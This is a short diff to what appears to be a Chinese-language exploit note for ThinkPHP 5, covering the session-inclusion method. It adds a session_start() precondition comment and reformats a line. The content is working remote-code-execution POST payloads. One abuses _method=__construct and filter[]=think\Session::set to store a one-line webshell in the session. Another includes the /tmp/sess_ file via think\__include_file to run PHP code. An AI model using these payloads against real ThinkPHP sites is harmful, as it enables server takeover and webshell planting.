@@ -36,9 +36,10 @@ postdata:
 - 方法3：Session包含
   
   ```
+  # 前提条件：session_start()
   # 设置session存入session缓存中
-  _method=__construct&filter[]=think\Session::set&method=get&get[]= 一句话&server[]=1
-
+_method=__construct&filter[]=think\Session::set&method=get&get[]= 一句话&server[]=1
+  
   # tp5的session文件均在/tmp/sess_sessionid  (sessionid=cookie里面的PHPSESSID)
   # phpinfo中session.save_path为session保存的路径，文件为：sess_sessionid
   _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=/tmp/sess_ejc3iali7uv3deo9g6ha8pbtoi&c=phpinfo();
